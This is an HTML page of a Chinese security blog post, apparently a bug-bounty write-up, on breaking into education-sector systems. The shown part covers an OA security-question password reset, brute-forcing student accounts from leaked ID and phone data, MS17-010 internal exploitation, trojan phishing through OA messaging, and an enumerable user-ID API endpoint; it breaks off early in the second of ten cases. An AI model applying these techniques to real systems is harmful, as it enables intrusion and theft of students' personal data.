@@ -1,0 +1,873 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>教育行业渗透打点 - bysec</title><meta name="Description" content="bysec个人博客"><meta property="og:url" content="https://www.bysec.cn/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/">
+  <meta property="og:site_name" content="bysec">
+  <meta property="og:title" content="教育行业渗透打点">
+  <meta property="og:description" content="bysec个人博客">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-07-28T18:23:14+08:00">
+    <meta property="article:modified_time" content="2024-07-28T18:23:14+08:00">
+    <meta property="article:tag" content="信息收集">
+    <meta property="article:tag" content="SRC">
+    <meta property="og:image" content="https://www.bysec.cn/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://www.bysec.cn/logo.png">
+  <meta name="twitter:title" content="教育行业渗透打点">
+  <meta name="twitter:description" content="bysec个人博客">
+<meta name="application-name" content="bysec">
+<meta name="apple-mobile-web-app-title" content="bysec">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://q.qlogo.cn/headimg_dl?dst_uin=1726946232&amp;spec=640"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://www.bysec.cn/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/" /><link rel="prev" href="https://www.bysec.cn/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E5%8F%8A%E6%B5%8B%E8%AF%95/" /><link rel="next" href="https://www.bysec.cn/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "教育行业渗透打点",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.bysec.cn\/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9\/"
+        },"genre": "posts","keywords": "信息收集, SRC","wordcount":  2318 ,
+        "url": "https:\/\/www.bysec.cn\/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9\/","datePublished": "2024-07-28T18:23:14+08:00","dateModified": "2024-07-28T18:23:14+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "bysec"
+            },"description": ""
+    }
+    </script></head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark');}
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="bysec">bysec</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"><i class='fa-fw fas fa-home'></i> 首页 </a><a class="menu-item" href="/posts/"><i class='fa-fw fas fa-archive'></i> 归档 </a><a class="menu-item" href="/categories/"><i class='fa-fw fas fa-folder-open'></i> 分类 </a><a class="menu-item" href="/tags/"><i class='fa-fw fas fa-tags'></i> 标签 </a><a class="menu-item" href="/link/"><i class='fa-fw fas fa-link'></i> 友链 </a><a class="menu-item" href="/about/"><i class='fa-fw fas fa-comment-dots'></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="bysec">bysec</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="#" onclick="return false;" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/" title=""><i class='fa-fw fas fa-home'></i>首页</a><a class="menu-item" href="/posts/" title=""><i class='fa-fw fas fa-archive'></i>归档</a><a class="menu-item" href="/categories/" title=""><i class='fa-fw fas fa-folder-open'></i>分类</a><a class="menu-item" href="/tags/" title=""><i class='fa-fw fas fa-tags'></i>标签</a><a class="menu-item" href="/link/" title=""><i class='fa-fw fas fa-link'></i>友链</a><a class="menu-item" href="/about/" title=""><i class='fa-fw fas fa-comment-dots'></i>关于</a><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1oa系统密码找回">1、OA系统密码找回</a></li>
+    <li><a href="#找回密码">找回密码</a></li>
+    <li><a href="#登录vpn">登录VPN</a></li>
+    <li><a href="#钓鱼">钓鱼</a></li>
+    <li><a href="#2逻辑漏洞修改密码">2、逻辑漏洞修改密码</a></li>
+    <li><a href="#github密码泄漏">GitHub密码泄漏</a></li>
+    <li><a href="#获取学号手机号">获取学号手机号</a></li>
+    <li><a href="#修改密码">修改密码</a></li>
+    <li><a href="#3github泄漏账号密码">3、Github泄漏账号密码</a></li>
+    <li><a href="#账号密码">账号密码</a></li>
+    <li><a href="#统一门户">统一门户</a></li>
+    <li><a href="#泛微oa">泛微OA</a></li>
+    <li><a href="#4向日葵密码读取">4、向日葵密码读取</a></li>
+    <li><a href="#heapdump文件泄漏">heapdump文件泄漏</a></li>
+    <li><a href="#向日葵密码读取">向日葵密码读取</a></li>
+    <li><a href="#5若依漏洞getshell">5、若依漏洞GetShell</a></li>
+    <li><a href="#定时任务命令执行">定时任务命令执行</a></li>
+    <li><a href="#shiro-反序列化漏洞">shiro 反序列化漏洞</a></li>
+    <li><a href="#sql注入">SQL注入</a></li>
+    <li><a href="#6fckeditor上传文件getshell">6、FCKeditor上传文件GetShell</a></li>
+    <li><a href="#7任意文件上传">7、任意文件上传</a></li>
+    <li><a href="#8s2反序列化漏洞getshell">8、S2反序列化漏洞GetShell</a></li>
+    <li><a href="#9逻辑漏洞">9、逻辑漏洞</a></li>
+    <li><a href="#找回密码-1">找回密码</a></li>
+    <li><a href="#统一门户-1">统一门户</a></li>
+    <li><a href="#10geoserver弱口令">10、geoserver弱口令</a></li>
+    <li><a href="#获取数据库密码">获取数据库密码</a></li>
+    <li><a href="#撞库">撞库</a></li>
+    <li><a href="#getshell">GetShell</a></li>
+    <li><a href="#总结">总结：</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">教育行业渗透打点</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="https://www.bysec.cn/" title="Author" target="_blank" rel="noopener noreferrer author" class="author">bysec</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E5%AD%A6%E4%B9%A0/"><i class="far fa-folder fa-fw"></i>学习</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-07-28">2024-07-28</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-07-28">2024-07-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2318 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1oa系统密码找回">1、OA系统密码找回</a></li>
+    <li><a href="#找回密码">找回密码</a></li>
+    <li><a href="#登录vpn">登录VPN</a></li>
+    <li><a href="#钓鱼">钓鱼</a></li>
+    <li><a href="#2逻辑漏洞修改密码">2、逻辑漏洞修改密码</a></li>
+    <li><a href="#github密码泄漏">GitHub密码泄漏</a></li>
+    <li><a href="#获取学号手机号">获取学号手机号</a></li>
+    <li><a href="#修改密码">修改密码</a></li>
+    <li><a href="#3github泄漏账号密码">3、Github泄漏账号密码</a></li>
+    <li><a href="#账号密码">账号密码</a></li>
+    <li><a href="#统一门户">统一门户</a></li>
+    <li><a href="#泛微oa">泛微OA</a></li>
+    <li><a href="#4向日葵密码读取">4、向日葵密码读取</a></li>
+    <li><a href="#heapdump文件泄漏">heapdump文件泄漏</a></li>
+    <li><a href="#向日葵密码读取">向日葵密码读取</a></li>
+    <li><a href="#5若依漏洞getshell">5、若依漏洞GetShell</a></li>
+    <li><a href="#定时任务命令执行">定时任务命令执行</a></li>
+    <li><a href="#shiro-反序列化漏洞">shiro 反序列化漏洞</a></li>
+    <li><a href="#sql注入">SQL注入</a></li>
+    <li><a href="#6fckeditor上传文件getshell">6、FCKeditor上传文件GetShell</a></li>
+    <li><a href="#7任意文件上传">7、任意文件上传</a></li>
+    <li><a href="#8s2反序列化漏洞getshell">8、S2反序列化漏洞GetShell</a></li>
+    <li><a href="#9逻辑漏洞">9、逻辑漏洞</a></li>
+    <li><a href="#找回密码-1">找回密码</a></li>
+    <li><a href="#统一门户-1">统一门户</a></li>
+    <li><a href="#10geoserver弱口令">10、geoserver弱口令</a></li>
+    <li><a href="#获取数据库密码">获取数据库密码</a></li>
+    <li><a href="#撞库">撞库</a></li>
+    <li><a href="#getshell">GetShell</a></li>
+    <li><a href="#总结">总结：</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><blockquote>
+<p><em>转载自： <a href="https://forum.butian.net/share/2423" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2423</a></em></p>
+</blockquote>
+<p>1、OA系统密码找回 找回密码 系统使用说明文档中发现登录账号 600030 密码找回，找回方式选择密保问题 问题选择出生地，密保问题答案填写高校所在地 即可修改密码 修改密码，即可以图文信息&hellip;</p>
+<h2 id="1oa系统密码找回" class="headerLink">
+    <a href="#1oa%e7%b3%bb%e7%bb%9f%e5%af%86%e7%a0%81%e6%89%be%e5%9b%9e" class="header-mark"></a>1、OA系统密码找回</h2><h2 id="找回密码" class="headerLink">
+    <a href="#%e6%89%be%e5%9b%9e%e5%af%86%e7%a0%81" class="header-mark"></a>找回密码</h2><p>系统使用说明文档中发现登录账号 600030</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004UrAaa0hDNRU.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004UrAaa0hDNRU.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004UrAaa0hDNRU.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000004UrAaa0hDNRU.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000004UrAaa0hDNRU.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000004UrAaa0hDNRU.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000004UrAaa0hDNRU.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000004UrAaa0hDNRU.jpg">
+    </a></p>
+<p>密码找回，找回方式选择密保问题</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000032mnlY3PpOhd.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000032mnlY3PpOhd.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000032mnlY3PpOhd.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD0000032mnlY3PpOhd.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD0000032mnlY3PpOhd.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD0000032mnlY3PpOhd.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD0000032mnlY3PpOhd.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD0000032mnlY3PpOhd.jpg">
+    </a></p>
+<p>问题选择出生地，密保问题答案填写高校所在地</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004Nk0wu0BMZlH.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004Nk0wu0BMZlH.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004Nk0wu0BMZlH.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000004Nk0wu0BMZlH.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000004Nk0wu0BMZlH.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000004Nk0wu0BMZlH.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000004Nk0wu0BMZlH.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000004Nk0wu0BMZlH.jpg">
+    </a></p>
+<p>即可修改密码</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004bnEDh05JXan.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004bnEDh05JXan.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004bnEDh05JXan.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000004bnEDh05JXan.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000004bnEDh05JXan.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000004bnEDh05JXan.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000004bnEDh05JXan.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000004bnEDh05JXan.jpg">
+    </a></p>
+<p>修改密码，即可以图文信息中心的身份登录OA系统</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002btP6H0mXX3t.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002btP6H0mXX3t.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002btP6H0mXX3t.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000002btP6H0mXX3t.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000002btP6H0mXX3t.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000002btP6H0mXX3t.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000002btP6H0mXX3t.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000002btP6H0mXX3t.jpg">
+    </a></p>
+<p>在文件中找到1400多名学生的敏感信息文件，其中存在手机号、身份证号、学号，可以组合密码本进行统一身份认证系统的爆破登录，默认密码为身份证后六位</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002KXPbU1ya42t.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002KXPbU1ya42t.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002KXPbU1ya42t.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000002KXPbU1ya42t.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000002KXPbU1ya42t.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000002KXPbU1ya42t.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000002KXPbU1ya42t.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000002KXPbU1ya42t.jpg">
+    </a></p>
+<p>成功登录一部分账号</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001qdUt93qwJJq.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001qdUt93qwJJq.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001qdUt93qwJJq.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000001qdUt93qwJJq.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000001qdUt93qwJJq.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000001qdUt93qwJJq.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000001qdUt93qwJJq.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000001qdUt93qwJJq.jpg">
+    </a></p>
+<h2 id="登录vpn" class="headerLink">
+    <a href="#%e7%99%bb%e5%bd%95vpn" class="header-mark"></a>登录VPN</h2><p>进行内网扫描，利用MS17010拿下C段多台主机权限</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001EcXz841eUJe.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001EcXz841eUJe.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001EcXz841eUJe.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000001EcXz841eUJe.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000001EcXz841eUJe.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000001EcXz841eUJe.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000001EcXz841eUJe.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000001EcXz841eUJe.jpg">
+    </a></p>
+<h2 id="钓鱼" class="headerLink">
+    <a href="#%e9%92%93%e9%b1%bc" class="header-mark"></a>钓鱼</h2><p>利用OA系统的通讯功能，散播木马</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003bmMjx1zeL4E.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003bmMjx1zeL4E.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003bmMjx1zeL4E.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000003bmMjx1zeL4E.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000003bmMjx1zeL4E.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000003bmMjx1zeL4E.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000003bmMjx1zeL4E.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000003bmMjx1zeL4E.jpg">
+    </a></p>
+<p>获取多台机器权限</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000oFuZj2LSw90.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000oFuZj2LSw90.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000oFuZj2LSw90.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000000oFuZj2LSw90.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000000oFuZj2LSw90.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000000oFuZj2LSw90.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000000oFuZj2LSw90.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000000oFuZj2LSw90.jpg">
+    </a></p>
+<h2 id="2逻辑漏洞修改密码" class="headerLink">
+    <a href="#2%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e%e4%bf%ae%e6%94%b9%e5%af%86%e7%a0%81" class="header-mark"></a>2、逻辑漏洞修改密码</h2><h2 id="github密码泄漏" class="headerLink">
+    <a href="#github%e5%af%86%e7%a0%81%e6%b3%84%e6%bc%8f" class="header-mark"></a>GitHub密码泄漏</h2><p>GitHub泄漏学号密码</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003VLa3e1UjMCe.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003VLa3e1UjMCe.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003VLa3e1UjMCe.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000003VLa3e1UjMCe.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000003VLa3e1UjMCe.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000003VLa3e1UjMCe.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000003VLa3e1UjMCe.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000003VLa3e1UjMCe.jpg">
+    </a></p>
+<p>但账号已被禁用</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003pitU03MEjjt.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003pitU03MEjjt.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003pitU03MEjjt.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000003pitU03MEjjt.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000003pitU03MEjjt.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000003pitU03MEjjt.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000003pitU03MEjjt.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000003pitU03MEjjt.jpg">
+    </a></p>
+<h2 id="获取学号手机号" class="headerLink">
+    <a href="#%e8%8e%b7%e5%8f%96%e5%ad%a6%e5%8f%b7%e6%89%8b%e6%9c%ba%e5%8f%b7" class="header-mark"></a>获取学号手机号</h2><p>存在注册功能的网站注册用户，然后登录</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003zaAW33Niuwl.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003zaAW33Niuwl.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003zaAW33Niuwl.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000003zaAW33Niuwl.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000003zaAW33Niuwl.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000003zaAW33Niuwl.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000003zaAW33Niuwl.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000003zaAW33Niuwl.jpg">
+    </a></p>
+<p>通过以下接口获得用户ID /User/GetUserListByKeyWord</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002w65kV1vNBL4.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002w65kV1vNBL4.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002w65kV1vNBL4.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000002w65kV1vNBL4.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000002w65kV1vNBL4.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000002w65kV1vNBL4.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000002w65kV1vNBL4.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000002w65kV1vNBL4.jpg">
+    </a></p>
+<p>可以通过以下接口遍历用户ID，获取任意用户的姓名 手机号 邮箱等敏感信息</p>
+<p>/User/Tip?time61&amp;id=caec35e7-9956-4f68-98bc-e2aee73ebda5&amp;_=1664438691592</p>
+<p>获取多组学号、姓名、手机号</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000V8TJA3fcDkY.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000V8TJA3fcDkY.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000V8TJA3fcDkY.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000000V8TJA3fcDkY.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000000V8TJA3fcDkY.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000000V8TJA3fcDkY.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000000V8TJA3fcDkY.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000000V8TJA3fcDkY.jpg">
+    </a></p>
+<h2 id="修改密码" class="headerLink">
+    <a href="#%e4%bf%ae%e6%94%b9%e5%af%86%e7%a0%81" class="header-mark"></a>修改密码</h2><p>点击同意门户的忘记密码功能，输入上面得到的学号</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000043XCYR1AAy9G.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000043XCYR1AAy9G.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000043XCYR1AAy9G.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD0000043XCYR1AAy9G.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD0000043XCYR1AAy9G.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD0000043XCYR1AAy9G.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD0000043XCYR1AAy9G.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD0000043XCYR1AAy9G.jpg">
+    </a></p>
